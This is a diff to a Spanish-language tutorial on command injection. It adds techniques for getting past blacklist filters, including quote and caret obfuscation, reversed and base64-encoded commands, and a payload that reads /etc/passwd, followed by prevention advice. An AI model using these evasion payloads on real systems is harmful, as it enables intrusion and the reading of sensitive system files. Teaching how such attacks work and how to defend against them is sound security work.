@@ -49,7 +49,7 @@ Al detectar el posible vector de ataque simplemente lo agregamos de la siguiente
 
 Este mismo procedimiento se puede realizar con cada uno de los operadores de la tabla.
 
-### Cómo evitar los filtros de espacios
+### Bypass de los filtros de espacios
 
 En muchos entornos de seguridad, el carácter de **espacio** (`" "`) se encuentra en listas negras para impedir la ejecución de comandos. Sin embargo, existen diferentes técnicas para evadir esta restricción y seguir inyectando. A continuación se presentan ejemplos:
 
@@ -182,3 +182,218 @@ Tras validarlo encontramos que al menos dos de ellas son correctos.
 
 [![command5](/images/command5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/command4.png)
 
+
+### Bypass de comandos en listas negras
+
+Algunas aplicaciones bloquean directamente comandos peligrosos (`whoami`, `cat`, etc.) mediante listas negras.  
+Estos filtros suelen ser muy básicos y buscan la palabra exacta, lo que permite evadirlos usando **obfuscación**: cambiar la forma en que se escribe el comando sin alterar su ejecución.
+
+---
+
+#### 1. Linux y Windows: uso de comillas `'` o `"`
+
+Los intérpretes (Bash, PowerShell, CMD) suelen **ignorar comillas** dentro de un comando, siempre que estén balanceadas.  
+Por eso, podemos dividir el comando con comillas y seguirá funcionando.
+
+Ejemplos:  
+
+    w'h'o'am'i
+    w"h"o"am"i
+
+> Nota: no mezclar tipos de comillas y deben usarse en número par.  
+
+> Nota 2: en el segundo ejemplo `am` va junto porque se pueden insertar comillas en cualquier punto, no es necesario hacerlo carácter por carácter.
+
+---
+
+#### 2. Linux: caracteres especiales
+
+En Linux, Bash también ignora otros caracteres al interpretar comandos:  
+
+    w\ho\am\i
+    who$@ami
+  
+
+---
+
+#### 3. Windows: carácter especial
+
+En Windows CMD se puede usar el **caret `^`** para romper un comando sin cambiar el resultado:  
+
+    who^ami
+
+---
+
+#### 4. Concatenación con variables vacías
+  En Linux se pueden usar variables no definidas para partir comandos:  
+
+      wh${X}oami  
+
+  Si `X` no existe, se interpreta igual que `whoami`.
+
+
+---
+
+#### Ejemplo
+
+```
+ip=127.0.0.1%0ac'a't%09${PATH:0:1}etc${PATH:0:1}passwd
+
+## Esto sería igual a cat /etc/passwd
+```
+
+### Ofuscación de comandos
+
+#### Manipulación de caracteres
+
+Esto permite evadir un filtro que bloquee la palabra exacta whoami, ya que se envía una variante (WhOaMi) y se transforma en minúsculas antes de ejecutarse.
+
+* En Windows:
+    ```
+    PS C:\> WhOaMi
+    ```
+
+* En Linux:
+    ```
+    $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+    ```
+
+    ```
+    $(a="WhOaMi";printf %s "${a,,}")
+    ```
+
+#### Comandos invertidos
+
+Esto funciona porque el **shell interpreta el resultado de un subshell como un comando válido**.
+
+* En Windows:
+    ```
+    "whoami"[-1..-20] -join ''
+    ```
+* En Linux:
+    ```
+    $(rev<<<'imaohw')
+    ```
+
+#### Comandos codificados
+
+A veces, cuando intentamos inyectar un comando en una aplicación vulnerable nos topamos con filtros que bloquean ciertos caracteres (`|`, espacios, etc.) o incluso palabras completas (`whoami`, `cat`). El problema es que el comando llega "roto" al sistema y no se ejecuta.  
+
+La idea es Codificar el comando en otro formato (base64, hex, etc.), y luego decodificarlo y ejecutarlo dentro del servidor.
+
+#### Ejemplo en Linux
+
+1. Tomamos el comando original (ej: `cat /etc/passwd | grep 33`) y lo codificamos en base64:  
+    ```
+    echo -n 'cat /etc/passwd | grep 33' | base64
+    ```
+    Resultado:  
+    ```
+    Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+    ```
+
+2. Ahora, en lugar de enviar el comando original, enviamos uno que **decodifica y ejecuta**:  
+    ```
+    bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+    ```
+    - `base64 -d` decodifica.  
+    - `$()` ejecuta lo decodificado.  
+    - `bash<<<` pasa el resultado directamente al shell.  
+
+El servidor corre el comando original sin que los filtros lo detecten, porque nunca apareció "escrito tal cual".
+
+#### Ejemplo en Windows
+
+En PowerShell se hace parecido, pero con sus propios métodos:  
+
+1. Codificamos en base64 el comando `whoami`:  
+    ```
+    [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+    ```
+    Resultado:  
+    ```
+    dwBoAG8AYQBtAGkA
+    ```
+
+2. Lo decodificamos y ejecutamos dinámicamente:  
+    ```
+    iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+    ```
+    - `FromBase64String` decodifica.  
+    - `GetString` lo convierte de bytes a texto.  
+    - `iex` (`Invoke-Expression`) ejecuta la cadena como comando.  
+
+
+#### ¿Por qué funciona?
+
+- Porque los **filtros buscan palabras exactas o caracteres específicos**.  
+- Al mandar el comando **codificado**, el filtro nunca ve la palabra prohibida (`whoami`, `cat`, etc.).  
+- El shell del servidor decodifica y ejecuta el comando original sin problemas.  
+
+
+#### Bonus
+
+- Si bloquean `bash`, se puede usar `sh`.  
+- Si bloquean `base64`, se puede usar `xxd`, `openssl` u otros métodos de encoding.  
+- Se puede mezclar con otras técnicas de **ofuscación de caracteres** para hacerlo aún más difícil de detectar.
+
+
+### Recomendaciones técnicas para prevenir Command Injection
+
+1. **Evitar el uso directo del sistema**  
+   - No ejecutar comandos del sistema operativo desde la aplicación siempre que sea posible.  
+   - Usar funciones o librerías nativas que reemplacen la necesidad de comandos externos (ej: APIs en lugar de `ping` o `cat`).  
+
+2. **Validación estricta de entradas (front-end y back-end)**  
+   - Nunca confiar en la validación solo en el cliente. Todo dato debe ser validado también en el servidor.  
+   - **PHP**: usar filtros nativos como `filter_var()` para validar formatos estándar (IP, emails, URL, etc.):  
+     ```php
+     if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
+         // call function
+     } else {
+         // deny request
+     }
+     ```
+   - **Regex personalizada**: cuando el formato no es estándar, usar expresiones regulares.  
+     Ejemplo en JavaScript:  
+     ```javascript
+     if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
+         // call function
+     } else {
+         // deny request
+     }
+     ```
+   - **NodeJS**: existen librerías como `is-ip` que facilitan la validación:  
+     ```javascript
+     const isIp = require('is-ip');
+     if (isIp(ip)) {
+         // call function
+     } else {
+         // deny request
+     }
+     ```
+   - En otros lenguajes (.NET, Java, etc.), revisar librerías estándar de validación para formatos de entrada.
+
+3. **Escape y sanitización**  
+   - Si inevitablemente se va a usar la entrada en un comando, escapar correctamente los caracteres especiales.  
+   - PHP → `escapeshellcmd()` o `escapeshellarg()`.  
+   - Python → `shlex.quote()`.  
+
+4. **Uso de APIs seguras**  
+   - Preferir funciones que no pasen por el intérprete de comandos.  
+   - Ejemplo en Python:  
+     ```python
+     subprocess.run(["ls", "-la"])
+     ```
+     en lugar de  
+     ```python
+     os.system("ls -la")
+     ```
+
+5. **Principio de privilegios mínimos**  
+   - Ejecutar la aplicación con un usuario de sistema restringido (nunca `root` o `Administrador`).  
+   - De esta forma, si hay explotación, el impacto será limitado.
+
+6. **Uso de WAF y RASP**  
+   - Un **Web Application Firewall (WAF)** puede ayudar a filtrar patrones de explotación comunes.  
+   - **Runtime Application Self-Protection (RASP)** protege en tiempo de ejecución dentro de la propia aplicación.
